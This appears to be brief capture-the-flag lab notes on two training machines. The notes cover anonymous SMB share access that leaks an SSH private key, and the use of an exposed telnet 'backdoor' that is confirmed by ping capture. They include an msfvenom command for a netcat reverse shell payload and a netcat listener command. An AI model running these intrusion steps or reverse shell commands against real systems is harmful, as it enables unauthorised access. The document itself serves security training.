SMB Machine

10.10.198.131

SMB Enumeration

3 Ports open

smb on 139 and 445

ssh on 22

found share called 'profiles' using enum4linux (python variant)
smb share 'profiles' allows anonymous access

logging in with anonymous works and we have a file saying that ssh is enabled for our profile

is .ssh we also have a pub and private key

reading the pub file we see the user name and therefore able to login in to 'cactus' using the private key and get the flag

Telnet Machine (Enumeration)

10.10.20.30

port open 8012

'Skidys Backdoor'

using sudo tcpdump ip proto \\icmp -i tun0 to dump pings to our machine, 
we can check if the 'backdoor' can execute commands

by pinging our machine we can see that commands can be run and that my machine can be accessed

then using msfvenom we create a simple netcat reverse shell
msfvenom -p cmd/unix/reverse_netcat lhost=*IP* lport=4444 R

and run nc -lvnp 4444
and run the payload on the target machine to recieve a reverse shell which gives us our flag
